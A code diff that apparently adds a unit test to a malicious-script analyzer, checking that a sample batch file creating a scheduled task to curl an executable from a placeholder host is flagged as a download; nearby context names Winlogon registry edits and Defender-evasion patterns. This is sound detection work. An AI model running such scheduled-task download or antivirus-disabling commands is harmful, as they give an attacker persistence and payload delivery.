@@ -1365,6 +1365,26 @@ reg add \"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v S
     }
 
     #[test]
+    fn schtasks_create_tr_recurses_into_nested_download() {
+        let script = br#"@echo off
+setlocal DisableDelayedExpansion
+schtasks /create /tn "Updater" /tr "cmd /V:ON /c set U=https://schtasks.example/p.exe&&curl -o out.exe !U!" /sc once /st 00:00
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://schtasks.example/p.exe"
+                        && dst.as_deref() == Some("out.exe")
+            )),
+            "nested scheduled-task action download missing: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn defender_evasion_traits_detected() {
         // Common AV-evasion patterns: Add-MpPreference exclusion,
         // Set-MpPreference -DisableRealtimeMonitoring $true, sc stop
